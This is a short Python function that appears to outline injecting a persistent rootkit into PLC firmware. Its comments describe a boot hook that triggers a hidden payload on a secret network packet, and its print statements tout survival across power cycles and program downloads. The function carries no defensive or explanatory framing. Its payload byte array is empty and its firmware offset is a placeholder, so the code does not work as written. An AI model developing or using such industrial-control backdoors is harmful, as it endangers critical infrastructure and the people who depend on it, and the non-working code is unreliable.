def create_plc_rootkit(firmware_image):
    """
    Inject rootkit into PLC firmware
    Survives power cycles and program downloads
    """
    # Parse firmware image (binary blob)
    # Identify bootloader section

    # Inject hook in boot sequence
    # Hook intercepts program execution on startup

    rootkit_code = bytes([
        # Assembly code to:
        # 1. Check for secret network packet
        # 2. If received, execute payload
        # 3. Continue normal boot
    ])

    # Insert at firmware offset (requires reverse engineering)
    offset = 0x1000  # Example offset
    modified_firmware = (
        firmware_image[:offset] +
        rootkit_code +
        firmware_image[offset+len(rootkit_code):]
    )

    print("[+] Rootkit injected into firmware")
    print("[!] Backdoor persists across:")
    print("    - Power cycles")
    print("    - Program downloads")
    print("    - Firmware updates (until overwritten)")

    return modified_firmware
